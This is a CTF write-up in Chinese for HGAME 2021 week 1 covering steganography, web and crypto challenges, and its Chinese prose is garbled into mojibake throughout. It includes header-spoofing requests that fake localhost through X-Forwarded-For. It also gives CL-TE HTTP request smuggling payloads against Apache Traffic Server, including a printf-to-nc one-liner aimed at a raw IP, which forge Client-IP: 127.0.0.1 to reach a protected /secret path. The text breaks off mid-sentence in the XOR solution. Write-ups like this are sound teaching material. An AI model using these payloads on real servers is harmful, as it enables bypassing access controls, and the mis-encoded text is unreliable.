å¥½ãï¼é›ªï¼æœ¬æ°—ãƒã‚¸ãƒƒã‚¯ï¼ˆå§æ§½ï¼ä¸‹é›ªäº†ï¼ç‰›é€¼å•Šï¼‰ å¯ä»¥æ¥å¬ä¸€å¬ =&gt; ç½‘æ˜“äº‘ï¼Œ QQ éŸ³ä¹ï¼Œè¿˜æŒºä¸é”™çš„ã€‚ ï¼ˆå½“ç„¶è¯„è®ºä¹Ÿæ²¡å•¥ä¸œè¥¿ Tab å’Œ ç©ºæ ¼ äº¤é”™çš„ï¼Œæ˜¯ä¸‹é¢è¿™ä¸€æ®µï¼Œç›²çŒœæ˜¯é›¶å®½å­—ç¬¦éšå†™ï¼Œä½†ä¸æ˜¯é›¶å®½å­—ç¬¦ã€‚ è¯•ç€æŠŠ tab å½“ä½œ1ï¼Œç©ºæ ¼å½“ä½œ0 s = \"\"\"...\"\"\" print(len(s)) x = '' for i in s: if i == '\\x09': # Tab x += '0' elif i == '\\x20': # Space x += '1' print(x) # 0101101111111011011111011111011101110110111101111011110111011111110110 print(x[::-1]) # 0110111111101110111101111011110110111011101111101111101101111111011010 å†è½¬ ASCIIï¼Œå‘ç°æ˜æ˜¾ä¸å¯¹ã€‚ ç„¶åå†çœ‹å›¾ï¼Œä¸‹é›ªäº†ï¼ŒæŸ¥ä¸€ä¸‹ï¼Œå‘ç°æœç„¶æœ‰ç§ç©ºç™½å­—ç¬¦çš„éšå†™æ–¹å¼ å« SNOWã€‚ å…ˆæ˜¯çœ‹åˆ°äº† é›ª-ç©ºç™½éšå†™æœ¯ï¼ˆ2013ï¼‰ è¿™ç¯‡ä»‹ç»ã€‚ ç„¶åæ‰¾åˆ°å®˜ç½‘ The SNOW Home Page Whitespace steganography â€‹ The program SNOW is used to conceal messages in ASCII text by appending whitespace to the end of lines. Because spaces and tabs are generally not visible in text viewers, the message is effectively hidden from casual observers. And if the built-in encryption is used, the message cannot be read even if it is detected. è¿™ä¸ªåŠ å¯† 2013 å¹´åŸºäº Apache 2.0 åè®®å¯ç”¨ çœ‹äº†çœ‹æ–‡æ¡£ï¼Œå·¨å¤è€ï¼ˆ $ SNOW.exe -C text.txt hgame{Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX} Extensive Reading: BTWï¼Œé›¶å®½å­—ç¬¦éšå†™çš„ Ga1@xy å¸ˆå‚…çš„ æµ…è°ˆåŸºäºé›¶å®½åº¦å­—ç¬¦çš„éšå†™æ–¹å¼ miscå­¦ä¹ ç¬”è®°1-txté›¶å®½åº¦å­—ç¬¦éšå†™ Some online tools: zero-width-lib zwsp-steg-js Unicode Steganography with Zero-Width Characters WebHitchhiking_in_the_Galaxy ç¬¬ä¸€æ¬¡åœ¨é“¶æ²³ç³»é‡Œæ­é¡ºé£è½¦ï¼Œè¦å‡†å¤‡å•¥ï¼Œåœ¨çº¿ç­‰ï¼ŒæŒºæ€¥çš„ http://5f517db502.hitchhiker42.0727.site:42420 è®¿é—®æç¤º æ­ä¸ªé¡ºé£è½¦ï¼Œè®¿é—® /HitchhikerGuide.phpï¼Œå‘ç°302åˆ°ä¸»é¡µ index.php äº†ã€‚ æ”¹æˆ POSTã€‚ ç„¶åä¸€ç³»åˆ—çš„å¥—è·¯å•¦ã€‚ â€‹ åªæœ‰ä½¿ç”¨â€æ— é™éæ¦‚ç‡å¼•æ“â€(Infinite Improbability Drive)æ‰èƒ½è®¿é—®è¿™é‡Œï½ â€‹ ä½ çŸ¥é“å—ï¼ŸèŒ„å­ç‰¹åˆ«è¦æ±‚ï¼šä½ å¾—ä»ä»–çš„Cardinalè¿‡æ¥ â€‹ flagä»…èƒ½é€šè¿‡æœ¬åœ°è®¿é—®è·å¾— æœ€åçš„ payload å¦‚ä¸‹ã€‚ POST /HitchhikerGuide.php HTTP/1.1 Host: 5f517db502.hitchhiker42.0727.site:42420 User-Agent: Infinite Improbability Drive Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://cardinal.ink/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Origin: http://5f517db502.hitchhiker42.0727.site:42420 Content-Length: 0 X-Forwarded-For: 127.0.0.1 hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!} watermelonhttp://watermelon.ryen.xyz:800/ å™¢ï¼Œåˆæˆå¤§è¥¿ç“œå•Šï¼Œå…¶å®å…ˆæ˜¯ç©äº†æŒºä¹…ç”šè‡³æœ‰ç‚¹ä¸Šç˜¾ï¼ˆå¤§é›¾ çœ‹åˆ°å¤±è´¥äº†ä¼šæç¤º â€œè¾¾åˆ°ä¸¤åƒåˆ†å°±å¯ä»¥å¾—åˆ°flagâ€ã€‚ ä¸‹é¢å¼€å§‹è§£é¢˜ï¼Œçœ‹äº†çœ‹ networkï¼Œå·¨å¤šæ–‡ä»¶ï¼Œä¸è¿‡æœ‰ç”¨çš„å¹¶ä¸å¤šï¼Œå¤§éƒ¨åˆ†æ˜¯å›¾ç‰‡éŸ³é¢‘ä»€ä¹ˆçš„ã€‚ å…ˆå…¨å±€æœäº†ä¸€ä¸‹ï¼Œæ²¡æ‰¾åˆ° flagï¼Œhgame ä¹Ÿæ²¡æœ‰ã€‚ å…³é”®çš„éƒ¨åˆ†åŒ…æ‹¬ index.htmlã€é…ç½® settings.jsã€ project.jsã€è¿˜æœ‰å¹¿å‘Š ads.jsï¼ˆä»–æ³¨é‡Šæ‰äº† éšæ„çœ‹äº†ä¸€ä¸‹å‘ç°æ‰“åŒ…çš„æœ‰ç‚¹å¥½ï¼Œæ‰‹è§£ä¸æ–¹ä¾¿ï¼Œconsole è°ƒè¯•ä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚ å¿ƒæƒ³ç€å‡ºé¢˜äººåº”è¯¥æ˜¯ç›´æ¥é­”æ”¹çš„æºç ï¼Œç„¶åå»æ‰¾æºç äº†ã€‚ åœ¨ GitHub ä¸Šæ‰¾åˆ°äº† åŸç‰ˆå’Œé­”æ”¹ç‰ˆçš„æºç  repo https://github.com/xiaopengand/daxigua å†æ¯”å¯¹ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†å¯ä»¥çš„éƒ¨åˆ†äº†ã€‚ å…¶å®å…¨å±€æœ gameover ä¹Ÿèƒ½æ‰¾åˆ°ï¼Œ233. hgame{do_you_know_cocos_game?} å…¶å®ç›´æ¥ base64 è§£å¯†ä¸€ä¸‹ä¹Ÿè¡Œã€‚ ï¼ˆå™¢ï¼Œcocos æ¸¸æˆå¼•æ“å•Š æ™ºå•†æ£€æµ‹é¸¡ åˆæœ‰è°ä¸çˆ±é«˜æ•°å‘¢ï¼Ÿåæ­£æˆ‘ä¸çˆ±ï¼ˆè¯·ä½¿ç”¨firefoxæµè§ˆå™¨æ‰“å¼€é¢˜ç›®ï¼‰ http://r4u.top:5000/ åˆæ˜¯ ç§¯åˆ†é«˜æ•°é¢˜å•Šï¼Œæƒ³èµ·äº† USTC Hackergame é‚£é“ è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨â€¦â€¦ ä¸è¿‡è¿™ä¸ªç®€å•ï¼Œç§¯åˆ†å¼å…¨éƒ¨ä¸ºax+bçš„å½¢å¼ï¼Œç›´æ¥åŒ¹é…ç›´æ¥ç®—å°±å¥½äº†ï¼Œéƒ½ä¸éœ€è¦å’Œ Mathematica è”åŠ¨ã€‚ ç›¸å…³çš„ API åœ¨ http://r4u.top:5000/static/js/fuckmath.js function getStatus(){ $.ajax({ type:\"GET\", url: \"/api/getStatus\", dataType:\"json\", success:function(data){ let solving = data['solving'] $(\"#status\").text(solving); if(solving === 100) getFlag(); } }); } function getQuestion(){ $.ajax({ type: \"GET\", url: \"/api/getQuestion\", dataType: \"json\", xhrFields: { withCredentials: true }, crossDomain: true, success:function(data){ $('#integral').html(data['question']); } }); } function getFlag(){ $.ajax({ type: \"GET\", url: \"/api/getFlag\", dataType: \"json\", success:function(data){ $('#flag').html(data['flag']); } }); } function init(){ getQuestion(); getStatus(); } function submit(){ $.ajax({ type: \"POST\", url: \"/api/verify\", data: JSON.stringify({answer:parseFloat($('#answer').val())}), dataType: \"json\", contentType: \"application/json;charset=utf-8\", xhrFields: { withCredentials: true }, crossDomain: true, success: function(data) { console.log(data); if (data['result'] === true) { init(); $('#alert').html(` &lt;div class=\"alert alert-success\"&gt;\\n &lt;strong&gt;Right!&lt;/strong&gt;\\n &lt;/div&gt;`) } else { $('#alert').html(` &lt;div class=\"alert alert-danger\"&gt;\\n &lt;strong&gt;Wrong!&lt;/strong&gt;\\n &lt;/div&gt;`) } } }); } è¿”å›çš„å…¬å¼æ ¼å¼ä¸º &lt;math&gt; &lt;mrow&gt; &lt;msubsup&gt; &lt;mo&gt;\\u222b&lt;/mo&gt; &lt;mrow&gt; &lt;mo&gt;-&lt;/mo&gt; &lt;mn&gt;92&lt;/mn&gt; &lt;/mrow&gt; &lt;mrow&gt; &lt;mn&gt;31&lt;/mn&gt; &lt;/mrow&gt; &lt;/msubsup&gt; &lt;mo&gt;(&lt;/mo&gt; &lt;mn&gt;12&lt;/mn&gt; &lt;mi&gt;x&lt;/mi&gt; &lt;mo&gt;+&lt;/mo&gt; &lt;mn&gt;17&lt;/mn&gt; &lt;mo&gt;)&lt;/mo&gt; &lt;mtext&gt; &lt;mi&gt;d&lt;/mi&gt; &lt;/mtext&gt; &lt;mi&gt;x&lt;/mi&gt; &lt;mtd /&gt; &lt;/mrow&gt; &lt;/math&gt; ç„¶åå†™è„šæœ¬å°±å¥½äº†ã€‚ # -*- coding: utf-8 -*- \"\"\" Hgame Week1 Web æ™ºå•†æ£€æµ‹é¸¡ http://r4u.top:5000/ @Author: MiaoTony @Time: 20210201 \"\"\" import requests import re from bs4 import BeautifulSoup host = \"http://r4u.top:5000\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\" } s = requests.Session() s.headers = headers def getInfo(url): r = s.get(url) r.encoding = 'utf-8' return r.json() def getStatus(): url = host + \"/api/getStatus\" r = getInfo(url) solving = r.get(\"solving\") print(\"---\", solving, \"---\") return solving def getFlag(): url = host + \"/api/getFlag\" r = getInfo(url) print(\"====&gt;\", r) def getQuestion(): url = host + \"/api/getQuestion\" r = getInfo(url) question = r.get(\"question\") print(\"====&gt;\", question) return question def submit(answer): url = host + \"/api/verify\" payload = {'answer': answer} r = s.post(url, json=payload).json() result = r.get(\"result\") print(\"&lt;====\", result) def solve(q): soup = BeautifulSoup(q, 'lxml') sub, sup = list(map(lambda x: int(x.text), soup.select('msubsup &gt; mrow'))) f = soup.select('math &gt; mrow')[0].text x = re.findall(r'\\((-?\\d+)x\\+(\\d+)\\)', f)[0] a, b = [int(i) for i in x] # a/2 x**2 + b x answer = a/2*(sup**2-sub**2) + b*(sup-sub) answer = round(answer, 2) print(answer) submit(answer) def main(): status = 0 while status &lt; 100: q = getQuestion() solve(q) status = getStatus() print() if status == 100: getFlag() if __name__ == \"__main__\": main() ç„¶åå°±æ˜¯æ„‰å¿«çš„è§£é¢˜ç¯èŠ‚ï¼Œæœ€åæ‹¿åˆ° flagã€‚ hgame{3very0ne_H4tes_Math} å®è—èµ°ç§è€… hint: æ³¨æ„ç•™æ„æœåŠ¡å™¨ä¿¡æ¯ èµ„æ–™ï¼šhttps://paper.seebug.org/1048/ å®è—èµ°ç§è€… Switch å–œæ¬¢å·ç›—å¹¶å°†å¥‡ç‰¹çš„å®è—èµ°ç§åˆ°ä¸€äº›é»‘å¸‚å•†å®¶æ‰‹ä¸­ã€‚ ä¸ºäº†é˜»æ­¢å…¶ç»§ç»­ä½œæ¶ï¼Œè­¦æ¢ Liki å¥‰å‘½å°† Switch æŠ“æ•å½’æ¡ˆã€‚ è°ƒæŸ¥è¿‡ç¨‹ä¸­ï¼ŒLiki å‘ç° Switch å°†ä¸€ä¸ªç§˜å¯†è—åœ¨äº†ä¸€ä¸ªç§äººæœåŠ¡å™¨ä¸­ã€‚ è¿™æˆ–è®¸ä¼šæˆä¸ºåç»­è¿½æŸ¥ Switch çš„é‡å¤§çº¿ç´¢ï¼Œä½ èƒ½æ‰¾åˆ°è¿™ä¸ªç§˜å¯†å—ï¼Ÿ Challenge Address: http://thief.0727.site:80 HTTP èµ°ç§ï¼Œç¬¬ä¸€æ¬¡å¬è¯´è¿™ä¸ªæ¦‚å¿µå–µã€‚ Apache Traffic Server çœ‹ä¸€ä¸‹æœåŠ¡å™¨ï¼ŒATS/7.1.2ï¼Œåœ¨æ¼æ´çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œè¿˜æ­£å¥½å’Œæ–‡ä¸­çš„ä¸€æ ·ã€‚ ç›´æ¥è®¿é—® /secret ä¼šæç¤º Client-IP NOT FOUND IN HEADERS!ã€‚ ä¼°è®¡å°±æ˜¯ ATS ä¼ åˆ°åé¢çš„ Nginx çš„æ—¶å€™ï¼Œæ²¡æœ‰å¸¦ä¸Š Client-IPï¼Œä½†æ˜¯å¦‚æœæ‰‹åŠ¨ç»™å®š Client-IP åˆ™ä¼šè¿”å›çœŸå®çš„ IP è€Œä¸æ˜¯è‡ªå·±è®¾ç½®çš„ã€‚ å‚è€ƒ https://paper.seebug.org/1048/#433ï¼Œè¿™ä¸ªç¬¬ä¸‰ä¸ªè¡¥ä¸ã€‚ https://github.com/apache/trafficserver/pull/3231 # 3231 éªŒè¯è¯·æ±‚ä¸­çš„Content-Lengthå¤´ è¯•äº†è¯• CL-TEèµ°ç§æ”»å‡»ã€‚ å¤¹å¸¦è¯·æ±‚ä¸€ä¸‹ / çœ‹çœ‹ï¼Œæœç„¶èƒ½å¤Ÿè¿”å›ä¸»é¡µã€‚ ç„¶åå¸¦ä¸Šæ”»å‡»çš„ Client-IP è¯•è¯•ï¼Œæ‹¿åˆ° flagã€‚ payload: GET /secret HTTP/1.1 Host: police.liki.link Content-Length: 49 Transfer-Encoding: chunked 0 GET /secret HTTP/1.1 Client-IP: 127.0.0.1 å°±æ˜¯è¯´å½“ ATS æŠŠè¿™ä¸€ä¸ª GET è¯·æ±‚äº¤ç»™ Nginx çš„æ—¶å€™ï¼Œåé¢çš„ Nginx è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ª GET è¯·æ±‚ï¼Œäºæ˜¯å½“ GET /secret HTTP/1.1 Client-IP: 127.0.0.1 è¿™ä¸€éƒ¨åˆ†åˆ° Nginx çš„æ—¶å€™ï¼Œå°±èƒ½ä¼ªé€ æœ¬åœ°äº†ã€‚ hgame{HtTp+sMUg9l1nG^i5~r3al1y-d4nG3r0Us!} èµ°ç§è€…çš„æ„¤æ€’ æœ¬é¢˜ä¸ºå®è—èµ°ç§è€…çš„æ›´æ”¹ç‰ˆæœ¬ï¼Œè€ƒç‚¹ç›¸åŒï¼Œè¯·å…ˆåšå‡ºå®è—èµ°ç§è€…Liki æ—¥è®°ï¼š2020å¹´2æœˆ2æ—¥ï¼šä»Šå¤©è­¦å±€å¯„æ¥ä¸€å°ä¿¡ï¼Œæ˜¯èµ°ç§è€… Switch å¯„æ¥çš„ï¼Œä¿¡é‡Œåªæœ‰ä¸€å¥è¯â€œæˆ‘æœ€è®¨åŒé¡ºé£è½¦ï¼Œæˆ‘å°†å¸¦æ¥æˆ‘çš„æ„¤æ€’â€çœŸæ˜¯è®©äººæ‘¸ä¸ç€å¤´è„‘â€¦â€¦æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ã€‚ Challenge Address: http://police.liki.link å’Œä¸Šé¢é‚£é¢˜ä¸åŒï¼Œè¿™ä¸ªç›´æ¥è®¿é—®å°±ç»™å‡ºäº† Client-IPã€‚ ä½†æ˜¯ payload å…¶å®æ˜¯ä¸€æ ·çš„ã€‚ ä¸è¿‡åœ¨ Burp Suite ä¸ä¸€å®šèƒ½å‡ºæ¥ï¼Œä»–åŸºæœ¬ä¸Šæ˜¯åªæ˜¾ç¤ºäº†ç¬¬ä¸€ä¸ªè¿”å›çš„ responseï¼Œemmm æ„Ÿè§‰æ˜¯ burp è®¾è®¡ä¸Šçš„é—®é¢˜ã€‚ ä½†æ˜¯ç›´æ¥åœ¨ nc é‡Œæ‰§è¡Œå°±å¥½äº†å•¦ã€‚ printf 'GET /secret HTTP/1.1\\r\\n''Host: police.liki.link\\r\\n''Content-Length: 49\\r\\n''Transfer-Encoding: chunked\\r\\n''\\r\\n''0\\r\\n''\\r\\n''GET /secret HTTP/1.1\\r\\n''Host: police.liki.link\\r\\n''Client-IP: 127.0.0.1\\r\\n''\\r\\n'| nc 42.193.143.243 80 å¾ˆæ˜æ˜¾èƒ½çœ‹åˆ°è¿”å›äº†ä¸¤ä¸ªå“åº”ï¼Œå¤šå‘å‡ æ¬¡å°±èƒ½åœ¨ç¬¬äºŒä¸ªè¿”å›é‡Œçœ‹åˆ° flag äº†ã€‚ hgame{Fe3l^tHe~4N9eR+oF_5mu9gl3r!!} çœ‹äº†å®˜æ–¹ WPï¼ŒåŸæ¥è¿™é¢˜ä¸­é—´å¤šå¥—äº†ä¸€å±‚ Nginxï¼Œæ¶æ„æ˜¯ ATS -&gt; Nginx -&gt; LNMPï¼Œè€Œå‰é¢é‚£é¢˜æ˜¯ ATS -&gt; LNMPã€‚ Cryptoã¾ã²ã¨ hint: flagçš„æ ¼å¼ä¸ºhgame{xxx}ï¼ˆé‡è¦ï¼‰ å¤§å®¶å¥½ï¼Œæˆ‘å«çœŸäººï¼Œæ¥è‡ªå’’æœ¯å›æˆ˜ï¼Œä½ ä¹Ÿå¯ä»¥å«æˆ‘ï¼Œç¼åˆæ€ªï¼ï¼ ---../-..../-..-./.----/-----/----./-..-./.----/-----/---../-..-./.----/.----/-----/-..-./----./-----/-..-./---../--.../-..-./...../...--/-..-./.----/-----/---../-..-./----./----./-..-./.----/-----/----./-..-./---../...../-..-./.----/.----/-..../-..-./---../....-/-..-./--.../.----/-..-./.----/-----/---../-..-./.----/.----/....-/-..-./----./--.../-..-./---../....-/-..-./.----/.----/..---/-..-./...../--.../-..-./---../-..../-..-./.----/-----/----./-..-./.----/.----/-..../-..-./.----/.----/-..../-..-./.----/-----/-----/-..-./.----/-----/--.../-..-./.----/.----/..---/-..-./.----/-----/...../-..-./--.../...--/-..-./---../....-/-..-./--.../-----/-..-./---../----./-..-./.----/-----/-----/-..-./-..../----./-..-./--.../-----/-..-./...../..---/-..-./----./-----/-..-./---../...--/-..-./--.../-----/-..-./.----/.----/.----/-..-./----./----./-..-./-..../----./-..-./....-/---../-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./....-/---../-..-./....-/---../-..-./.----/.----/....-/-..-./--.../----./-..-./---../---../-..-./.----/-----/....-/-..-./.----/..---/-----/-..-./.----/-----/.----/-..-./.----/.----/-----/-..-./--.../....-/-..-./---../...../-..-./---../....-/-..-./---../-..../-..-./...../--.../-..-./--.../----./-..-./----./--.../-..-./.----/.----/-----/-..-./...../...--/-..-./.----/-----/-..../-..-./---../...../-..-./.----/-----/----./-..-./----./----./-..-./....-/---../-..-./.----/-----/.----/-..-./-..../...../-..-./-..../.----/-..-./-..../.---- Morse code 86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61 ç„¶å chrï¼Œbase64 import base64 s = \"86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61\" l = s.split('/') r = '' for i in l: x = chr(int(i)) print(x) r += x print(r) # VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA== r2 = base64.b64decode(r) print(r2) # b'Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x' Vigenere è§£å¯†å¾—åˆ° }KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n çœ‹ä¸Šå»åƒæ˜¯é€†åºäº†çš„ n4yGu~zF_BLhrfp9+C{1Eez!upPlN1!tYnccK} çœ‹æ ·å­åˆä¸åƒã€‚é‡Œé¢éƒ½æ²¡æœ‰ hgameï¼Œåˆè¯•äº†è¯•æ …æ ï¼Œè¿™ä¸å¯¹åŠ²å•Šã€‚ çœ‹äº†å®˜æ–¹ WP åï¼Œè¿™6ä¸ªæ …æ å°±ç¦»è°±ï¼ å¤ªå¥‡æ€ªäº†ï¼ï¼ï¼ }KccnYt !1NlPpu !zeE1{ C+9pfr hLB_Fz ~uGy4n =====&gt; }!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu ç„¶åé€†åº utnzr{pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!} å‡¯æ’’ / ROT13 hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!} å¯¹ç§°ä¹‹ç¾ ç¾æœ¯å¤§å¸ˆ Liki æ€»è¯´ï¼Œå¯¹ç§°æ˜¯ä¸–ç•Œä¸Šæœ€ç¾çš„ç»“æ„â€¦ æºç ï¼š import random import string import itertools from secret import FLAG key = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) cipher = bytes([ord(m)^ord(k) for m, k in zip(FLAG, itertools.cycle(key))]) print(cipher) #cipher=b'&gt;\\tA+/\\x01@\"\\x08T\\x1a\\x1a\\x17\\x05\\x07\\x11\\x143Kf5\\x0cQ&gt;Q\\x00\\x1b\\x11\\x17\\x01\\x19\\x00Y?V21D[6Q~\\x12TG\\x05\\x1c\\x0b@3V!b\\x0bFp\\x15\\x06\\x12\\x03^\\n\\x12EV;T\\',\\x07Qp\\x14\\x15\\x10\\x1c\\x17\\x0b\\x01\\rQ(\\x18L-\\x11@~Q \\x1b\\x1dDD\\x16\\nA6\\\\f \\x01\\x14$\\x19\\x11S\\x1bU\\x0e\\x10\\x06@)\\x182*\\x01Y#\\x14\\x18\\x05\\x11DHUoV/Lf+\\x10\\x143\\x10\\x1aS\\x15[\\x17\\x1aEF?T\\'6\\x01\\x14$\\x1eT\\x10\\x1b[\\x0b\\x07\\x16\\x14;V\"bn[$\\x19\\x11\\x01TT\\x0b\\x18\\x15[)Q2+\\x0bZ1\\x1dT\\x07\\x11T\\x0c\\x1b\\x0cE/]5lnm?\\x04T\\x1e\\x15ND\\x1b\\n@zJ##\\x08]*\\x14T\\x1a\\x00\\x1bD\\x17\\x10@zA)7\\x16\\x142\\x03\\x15\\x1a\\x1a\\x17n\\x1c\\x16\\x148M5;DC?\\x03\\x1f\\x1a\\x1aPD\\x17\\x00\\\\3V\"b\\x10\\\\5Q\\x07\\x10\\x11Y\\x01\\x06E@5\\x185\\'\\x01_p{\\x1b\\x06\\x00\\x17\\x17\\x0c\\x08Y?L4;DC8\\x14\\x1aS\\rX\\x11U\\t[5Sf#\\x10\\x141Q\\x04\\x12\\x1dY\\x10\\x1c\\x0bSt\\x18L\\x16\\x0cQ\"\\x14T\\x12\\x06RD\\x06\\x00B?J\\'.DF5\\x10\\x07\\x1c\\x1aDD\\x13\\nFzL.+\\x17\\x1ap%\\x1c\\x16T=\\x02\\x1c\\x17G.\\x18/1D@8\\x10\\x00S\\x03RC\\x07\\x00\\x142Y4&amp;IC9\\x03\\x11\\x17TC\\x0bU\\t[5Sf$\\x0bFp{\\x1d\\x07Z\\x17+\\x00\\x17\\x14;V%+\\x01Z$Q\\x15\\x1d\\x17R\\x17\\x01\\nF)\\x18+#\\x1d\\x14&gt;\\x1e\\x00S\\x1cV\\x12\\x10E\\\\;\\\\fH\\x05\\x14&gt;\\x10\\x19\\x16TQ\\x0b\\x07E].\\x14f \\x11@p\\x05\\x1c\\x16\\r\\x17\\x0f\\x1b\\x00CzL.#\\x10\\x14$\\x19\\x11\\x1a\\x06\\x17n\\x1a\\x12ZzZ)&amp;\\rQ#Q\\x03\\x16\\x06RD\\x17\\x04G3[\\'.\\x08Mp\\x02\\r\\x1e\\x19R\\x10\\x07\\x0cW;Tjb\\x05Gp{\\x03\\x16\\x06RD\\x01\\r[)]f-\\x02\\x14 \\x1e\\x00\\x16\\x1aC\\r\\x14\\t\\x14*J#&amp;\\x05@?\\x03\\x07S\\x1bED\\x05\\x17Q#\\x16fH0\\\\5\\x03\\x11\\x15\\x1bE\\x01YE@2Q5b\\x07U=\\x14T\\x1a\\x1a\\x17\\x0c\\x14\\x0bP#\\x181*\\x01@8\\x14\\x06S~T\\x0c\\x1a\\nG3V!b\\x05\\x14=\\x10\\x00\\x16X\\x17\\x07\\x14\\x11W2Q(%DP9\\x1f\\x1a\\x16\\x06\\x17\\x0b\\x07E&gt;;N)+\\x00]&gt;\\x16T\\x11\\x11^\\n\\x12E[4\\x182*\\x01\\x14=\\x14\\x1a\\x06TX\\x02U\\x04\\x14)V\\'0\\x08]&gt;\\x16XS~_\\x11\\x1b\\x02F#\\x186#\\x07_p\\x1e\\x12S\\x03X\\x08\\x03\\x00GzW4b\\x06Q1\\x03\\x07R~c\\x05\\x1e\\x00\\x14;\\x18*-\\x0b_p\\x10\\x00S\\rX\\x11\\x07ER;[#b\\rZp\\x05\\x1c\\x16TZ\\r\\x07\\x17[(\\x18L#\\nPp\\x18\\x19\\x12\\x13^\\n\\x10EUzT/,\\x01\\x14#\\x05\\x06\\x12\\x1dP\\x0c\\x01EP5O(b\\x10\\\\5Q~\\x1e\\x1dS\\x00\\x19\\x00\\x1aza)7CX&lt;Q\\x07\\x16\\x11\\x17\\x06\\x1a\\x11\\\\zK/&amp;\\x01Gp\\x1e\\x12S\\rX\\x11\\x07E&gt;&lt;Y%\\'DU\"\\x14T\\x03\\x06R\\x10\\x01\\x1c\\x14)A+/\\x01@\"\\x18\\x17\\x12\\x18\\x19D!\\r])\\x18/1D&gt;;\\x1f\\x1b\\x04\\x1a\\x17\\x05\\x06EV3T\\'6\\x01F1\\x1dT\\x00\\rZ\\t\\x10\\x11F#\\x18\\',\\x00\\x149\\x05S\\x00T=\\x13\\x1d\\x00F?\\x18$-\\x10\\\\p\\x02\\x1d\\x17\\x11DD\\x10\\x0c@2]4b\\x17]4\\x14T\\x1c\\x12\\x17\\x10\\x1d\\x0cGz2\"+\\x12]4\\x18\\x1a\\x14T[\\r\\x1b\\x00\\x14;H6\\'\\x05Fp\\x1c\\x1b\\x01\\x11\\x17\\x0b\\x07EX?K5b\\x10\\\\5Q\\x07\\x12\\x19RJ\\x7f6[zP#0\\x01\\x149\\x02T\\x07\\x1cRD\\x13\\tU=\\x02fH\\x0cS1\\x1c\\x11\\x08,\\x07\\x16*\\x0c\\x01wY\\x1977\\x076$EX@Y\\x00Q\\x03a\\x14V?\\x1d\\'\\x05 9G\\x01\\t=' åˆ©ç”¨ xortoolï¼Œå¯ä»¥å¸®åŠ©å¾—åˆ°è¿™ä¸ªåŠ å¯†ä½¿ç”¨çš„ keyã€‚ xortool.py xortool A tool to do some xor analysis: - guess the key length (based on count of equal chars) - guess the key (base on knowledge of most frequent char) Usage: xortool [-x] [-m MAX-LEN] [-f] [-t CHARSET] [FILE] xortool [-x] [-l LEN] [-c CHAR | -b | -o] [-f] [-t CHARSET] [-p PLAIN] [FILE] xortool [-x] [-m MAX-LEN| -l LEN] [-c CHAR | -b | -o] [-f] [-t CHARSET] [-p PLAIN] [FILE] xortool [-h | --help] xortool --version Options: -x --hex input is hex-encoded str -l LEN, --key-length=LEN length of the key -m MAX-LEN, --max-keylen=MAX-LEN maximum key length to probe [default: 65] -c CHAR, --char=CHAR most frequent char (one char or hex code) -b --brute-chars brute force all possible most frequent chars -o --brute-printable same as -b but will only check printable chars -f --filter-output filter outputs based on the charset -t CHARSET --text-charset=CHARSET target text character set [default: printable] -p PLAIN --known-plaintext=PLAIN use known plaintext for decoding -h --help show this help ç”±äºå®ƒçš„ FILE è¾“å…¥éœ€è¦çš„æ˜¯ binary æˆ–è€… hex æˆ–è€… plain textï¼Œè€Œè¿™é‡Œçš„ cipher æ˜¯ Python é‡Œçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å…ˆè½¬æ¢æˆ hexã€‚ cipher = 'xxxxxx' print(cipher.hex()) ç„¶åæŠŠè¿™ä¸ª hex ä¿å­˜åˆ°æ–‡ä»¶ï¼Œæ¯”å¦‚ cipher.txt. è¯•äº†ä¸€ä¸‹ï¼ŒæŒ‡å®š -l 16 å€’æ²¡ä½œç”¨ï¼Œ-p \"hgame{\" ç”šè‡³ä¼šæŠ¥é”™ã€‚æœ€åè¿˜æ˜¯ç”¨ä¸‹é¢è¿™ä¸ªå¥½äº†ã€‚ $ xortool -x -c 20 cipher.txt The most probable key lengths: 2: 10.3% 4: 10.9% 6: 9.3% 8: 15.0% 10: 7.7% 12: 8.5% 14: 7.4% 16: 15.5% 32: 7.8% Key-length can be 4*n 2 possible key(s) of length 16: 4Z8FB!4Pqtst7d'e 4Z8FB!4P4tst7d'e Found 2 plaintexts with 95%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv çœ‹ä¸€çœ‹è¾“å‡ºçš„æ–‡ä»¶ï¼Œå·²ç»å¾ˆæœ‰å‘³é“äº†ï¼Œflag éƒ½å¾ˆæ˜æ˜¾äº†ã€‚ æ ¹æ®å‡ºæ¥çš„ key 